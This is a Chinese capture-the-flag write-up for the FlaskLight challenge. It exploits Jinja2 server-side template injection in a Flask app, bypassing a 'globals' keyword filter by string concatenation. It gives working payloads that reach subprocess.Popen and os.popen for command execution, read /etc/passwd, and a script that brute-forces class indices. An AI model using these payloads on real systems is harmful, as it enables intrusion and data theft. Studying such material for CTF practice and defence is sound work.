# [CSCCTF 2019 Qual]FlaskLight 过滤 url_for globals 绕过globals过滤

**目录**

[TOC]



  
 [](https://blog.csdn.net/rfrder/article/details/111239601) 

这题很明显就是SSTI了



<img src="https://i-blog.csdnimg.cn/blog_migrate/9b594a068b8bdfc2f1de671e663d3ddb.png" alt="" style="max-height:335px; box-sizing:content-box;" />


源代码

我们试试看

{{7*7}}



<img src="https://i-blog.csdnimg.cn/blog_migrate/186aa5118ac86a7e9e2d354511b5e8fb.png" alt="" style="max-height:312px; box-sizing:content-box;" />


然后我们就开始吧

原本我的想法是直接{{url_for.__globals__}}

但是回显是直接500 猜测过滤 我们正常来吧

```handlebars
{{"".__class__}}  查看当前情况
 
{{"".__class__.__base__}} 查看基类 这里发现没有利用的 我们修改代码
 
{{"".__class__.__mro__}}  查看全部类  发现存在<type 'object'>了
 
 
 
{{"".__class__.__mro__[2].__subclasses__()}}  查看object的子类
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ba2b09ddb71da8dbb8038f7d1483078f.png" alt="" style="max-height:770px; box-sizing:content-box;" />


这里我们需要 os 来调用

但是这里存在一个类 可以不需要os

## subprocess.Popen

 [Python3 subprocess | 菜鸟教程](https://www.runoob.com/w3cnote/python3-subprocess.html) 

需要参数

```cobol
("命令",shell=True,stdout=-1)
 
这里 stdout  就是指定输出 PIPE
```

然后我们可以使用 其方法来进行交互

```cobol
("命令",shell=True,stdout=-1).communicate()
```

这样我们就可以实现rce

首先通过 脚本跑出来其的位数

```cobol
import time
 
import  requests
 
base_url="http://1a3ad76d-35d3-4a35-97fb-8997c87bf989.node4.buuoj.cn:81/?search="
 
for i in range(300):
    payload="{{\"\".__class__.__mro__[2].__subclasses__()[%s]}}"%i
    r = requests.get(url=base_url + payload)
    if "subprocess.Popen" in r.text:
        print(i)
    if r.status_code == 429:
        time.sleep(0.5)
```

跑出来是258



我们开始构造

```handlebars
?search={{''.__class__.__mro__[2].__subclasses__()[258]("ls",shell=True,stdout=-1).communicate()[0].strip()}}
 
最后的.communicate()[0].strip() 通过 communicate方法 输出 并且指定数组 去除空白符
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d703b4d88d54fd8097c8122210e4d13a.png" alt="" style="max-height:106px; box-sizing:content-box;" />


我们看看 flasklight看看

```handlebars
?search={{''.__class__.__mro__[2].__subclasses__()[258]("cat /flasklight/coomme_geeeett_youur_flek",shell=True,stdout=-1).communicate()[0].strip()}}
```

## FILE

这是另一个方法 通过file读取文件

首先我们要测试一下

先查找一下 file



<img src="https://i-blog.csdnimg.cn/blog_migrate/290f24cab36a1c029a2c5d20782281f6.png" alt="" style="max-height:355px; box-sizing:content-box;" />


发现是40

然后我们看看

```handlebars
{{"".__class__.__mro__[2].__subclasses__()[40]}}
```

```handlebars
/?search={{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/11361e2cbe944622ed9f5b20c7f375f8.png" alt="" style="max-height:301px; box-sizing:content-box;" />


读取成功

然后我们去读一下命令行吧



<img src="https://i-blog.csdnimg.cn/blog_migrate/81c572057cae1a9459f941ecb1228575.png" alt="" style="max-height:152px; box-sizing:content-box;" />


发现读出了路径

我们看看这个py



<img src="https://i-blog.csdnimg.cn/blog_migrate/b8fe33fe7822debca1a8e89eaaaded61.png" alt="" style="max-height:279px; box-sizing:content-box;" />


但是还是没有办法直接读取出来 因为不知道flag的文件名字

## warnings.catch_warnings

我们首先找一下这个类的位数

59

```handlebars
{{"".__class__.__mro__[2].__subclasses__()[59].__init__}}
```

这里就卡住了 因为我们还是需要 globals的参与

我们如何绕过过滤呢

```handlebars
{{"".__class__.__mro__[2].__subclasses__()[59].__init__['__glo'+'bals__']}}
```

这样就可以

我们在上面也知道 是通过匹配过滤的

做到这个我们其实就可以正常rce了 但是还是完善一下这个类的用法吧



<img src="https://i-blog.csdnimg.cn/blog_migrate/05c9fd129a6b1d090443c69a50ffa419.png" alt="" style="max-height:171px; box-sizing:content-box;" />


这里我们能发现 这个类没有加载 os 需要我们手动加载

我们需要在其

```less
['__builtins__']['eval']
```

下导入

payload

```handlebars
?search={{"".__class__.__mro__[2].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

这样就借助 os 实现了 rce

## site._Printer

我们知道了 globals可以拼接绕过

这个方法也可以实现我们看看里面是否内置了 os

```cobol
?search={{"".__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/025b2b158b7694cc1c3d64d75a827d4c.png" alt="" style="max-height:203px; box-sizing:content-box;" />


发现存在 我们直接rce即可

```handlebars
?search={{"".__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a7abe678f689d9b18ed55c9d61051b11.png" alt="" style="max-height:180px; box-sizing:content-box;" />


最后读取即可